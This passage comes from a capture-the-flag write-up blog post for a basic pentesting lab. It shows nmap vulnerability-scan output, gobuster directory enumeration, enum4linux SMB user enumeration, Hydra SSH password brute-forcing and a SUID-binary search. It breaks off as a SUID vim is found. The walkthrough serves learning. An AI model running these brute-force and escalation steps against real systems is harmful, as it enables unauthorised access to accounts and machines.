\tMSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/\t*EXPLOIT*\n|     \tEDB-ID:50119\t4.3\thttps://vulners.com/exploitdb/EDB-ID:50119\t*EXPLOIT*\n|     \tEDB-ID:50118\t4.3\thttps://vulners.com/exploitdb/EDB-ID:50118\t*EXPLOIT*\n|     \tCVE-2021-41079\t4.3\thttps://vulners.com/cve/CVE-2021-41079\n|     \tCVE-2021-24122\t4.3\thttps://vulners.com/cve/CVE-2021-24122\n|     \tCVE-2019-0221\t4.3\thttps://vulners.com/cve/CVE-2019-0221\n|     \tCVE-2018-8037\t4.3\thttps://vulners.com/cve/CVE-2018-8037\n|     \tCVE-2018-11784\t4.3\thttps://vulners.com/cve/CVE-2018-11784\n|     \t1337DAY-ID-36546\t4.3\thttps://vulners.com/zdt/1337DAY-ID-36546\t*EXPLOIT*\n|     \t1337DAY-ID-36545\t4.3\thttps://vulners.com/zdt/1337DAY-ID-36545\t*EXPLOIT*\n|     \tTOMCAT:909935A4BEB7C54CD1FA804D13CDD890\t4.0\thttps://vulners.com/tomcat/TOMCAT:909935A4BEB7C54CD1FA804D13CDD890\n|     \tCVE-2020-13943\t4.0\thttps://vulners.com/cve/CVE-2020-13943\n|     \tSMNTC-111247\t0.0\thttps://vulners.com/symantec/SMNTC-111247\n|_    \tSMNTC-111245\t0.0\thttps://vulners.com/symantec/SMNTC-111245\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php\n|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=11/4%OT=22%CT=1%CU=34280%PV=Y%DS=4%DC=T%G=Y%TM=618494C\nOS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS\nOS:=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M\nOS:506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\nOS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\nOS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\nOS:=40%CD=S)\n\nUptime guess: 0.019 days (since Thu Nov  4 19:52:32 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false\n| smb-vuln-regsvc-dos: \n|   VULNERABLE:\n|   Service regsvc in Microsoft Windows systems vulnerable to denial of service\n|     State: VULNERABLE\n|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference\n|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes\n|       while working on smb-enum-sessions.\n|_          \n\nTRACEROUTE (using port 587/tcp)\nHOP RTT       ADDRESS\n1   30.62 ms  10.13.0.1\n2   ... 3\n4   172.85 ms 10.10.74.250\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Nov  4 20:19:52 2021 -- 1 IP address (1 host up) scanned in 1390.99 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Available services:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;OpenSSH 7.2p2 on port 22&lt;/li&gt;\n&lt;li&gt;Apache 2.4.18 on port 80&lt;/li&gt;\n&lt;li&gt;Samba 3 or 4 on ports 139/445&lt;/li&gt;\n&lt;li&gt;Apache Jserve on port 8009&lt;/li&gt;\n&lt;li&gt;Apache Tomcat 9.0.7 on port 8080&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The server looks to be running Ubuntu.&lt;/p&gt;\n&lt;p&gt;Going to &lt;code&gt;http://10.10.74.250:80&lt;/code&gt; revels a generic “maintenance” page, but there’s a note to “[c]heck our dev note section if you need to know what to work on.”&lt;/p&gt;\n&lt;p&gt;Going to &lt;code&gt;http://10.10.74.250:8080&lt;/code&gt; reveals what looks like the generic first-run Tomcat page. Poking around there doesn’t reveal any obvious modifications.&lt;/p&gt;\n&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Let’s hit &lt;code&gt;http://10.10.74.250:80&lt;/code&gt; with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; and see what we find!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It looks like there’s a “hidden” directory here…&lt;/p&gt;\n&lt;h2 id=&quot;flags-2-3-4-and-5&quot;&gt;Flags 2, 3, 4, and 5&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flags-2-3-4-and-5&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This hidden directory contains two files.&lt;/p&gt;\n&lt;p&gt;dev.txt:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;2018-04-23: I&#039;ve been messing with that struts stuff, and it&#039;s pretty cool! I think it might be neat\nto host that on this server too. Haven&#039;t made any real web apps yet, but I have tried that example\nyou get to show off how it works (and it&#039;s the REST version of the example!). Oh, and right now I&#039;m \nusing version 2.5.12, because other versions were giving me trouble. -K\n\n2018-04-22: SMB has been configured. -K\n\n2018-04-21: I got Apache set up. Will put in our content later. -J\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Okay, so we’ve got two users, “J” and “K”, and an example REST app of some kind (using Apache Struts?) with version 2.5.12.&lt;/p&gt;\n&lt;p&gt;j.txt:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;For J:\n\nI&#039;ve been auditing the contents of /etc/shadow to make sure we don&#039;t have any weak credentials,\nand I was able to crack your hash really easily. You know our password policy, so please follow\nit? Change that password ASAP.\n\n-K\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Seems like J has a weak password.&lt;/p&gt;\n&lt;p&gt;From a quick check of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/man&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/man&quot;&gt;man&lt;/a&gt; page, it looks like we can feed it a list of usernames with the -L option. I’m going to make a couple assumptions:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Usernames are probably English-language first names. I’m guessing this because the comments in the /development directory are in English, and because this is supposed to be an “easy” CTF.&lt;/li&gt;\n&lt;li&gt;The password is probably listed in the rockyou.txt dump. Again, both because of the comment, and because this is an “easy” CTF.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;A couple of quick searches on &lt;a href=&quot;https://duckduckgo.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DuckDuckGo&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; landed me on &lt;a href=&quot;https://github.com/jeanphorn/wordlist/blob/master/usernames.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this list of common usernames&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; I’m going to filter that down to just the Js and then feed it + rockyou.txt into &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; j.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Except… That’s going to take &lt;em&gt;forever&lt;/em&gt;. The hint suggests looking at Samba to find usernames, which is a good reminder.&lt;/p&gt;\n&lt;p&gt;I &lt;em&gt;thought&lt;/em&gt; I had some notes about how to do this, but it looks like I don’t. But a little bit of search brings me to &lt;a href=&quot;https://www.infosecademy.com/nmap-smb-scripts-enumeration/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. To &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; again!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; basic-pentesting-enumerate-smb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; smb-enum-users.nse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p445&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;But this doesn’t return any results (maybe it’s Windows-specific?).&lt;/p&gt;\n&lt;p&gt;A bit more internet searching and I arrive at &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Enumerate SMB with Enum4linux &amp;#x26; Smbclient&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which suggests using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/enum4linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;enum4linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;But this errors out on me before outputting any useful information. (It did list a user named krbtgt, but after getting excited and thinking this might be “K” I realized that this looked like it might be related to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt;… And a brief internet search confirmed this.)&lt;/p&gt;\n&lt;p&gt;Trying to use the Metasploit module auxiliary/smb/smb_lookupsid as suggested in &lt;a href=&quot;https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;A Little Guide to SMB Enumeration&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; just resulted in an error about the server not being “able to handle the encrypted request.”&lt;/p&gt;\n&lt;p&gt;Switching back to trying to get &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/enum4linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; to work, I tried calling it &lt;em&gt;without&lt;/em&gt; the -U flag. This does a full enumeration, and in particular tries to “brute-force” usernames by guessing SIDs. This worked! (I still got the same error, but the enumeration continued…)&lt;/p&gt;\n&lt;p&gt;Let’s turn back to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt;, but now using the usernames we just found. I’m also going to try a shorter wordlist, because rockyou.txt is ridiculously long.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/nmap.lst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;We’ve got a match, and we’re in!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; SSH_AUTH_SOCK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; SSH_AGENT_PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;flag-6&quot;&gt;Flag 6&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-6&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Now that we’re in, let’s see if we can escalate privileges.&lt;/p&gt;\n&lt;p&gt;The home directory we’re in is a little weird… It contains a single file (~/.lesshst), and is owned by root!&lt;/p&gt;\n&lt;p&gt;Home directories are world-readable, so we can see what’s in the other user’s home. It looks more normal… But also contains a file called pass.bak, which looks like it might be our last flag (“the final password”). Unfortunately, it’s not world-readable, and neither are any of the history files in that directory.&lt;/p&gt;\n&lt;p&gt;Does the current user have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; privileges? Running &lt;code&gt;sudo -l&lt;/code&gt; suggests not.&lt;/p&gt;\n&lt;p&gt;Let’s see if there are any interesting binaries on the system that the current user both has access to and I could potentially abuse.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -g+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; {}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;And… /usr/bin/vim.basic is SUID root?!? &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot; class=&quot;external&quot; 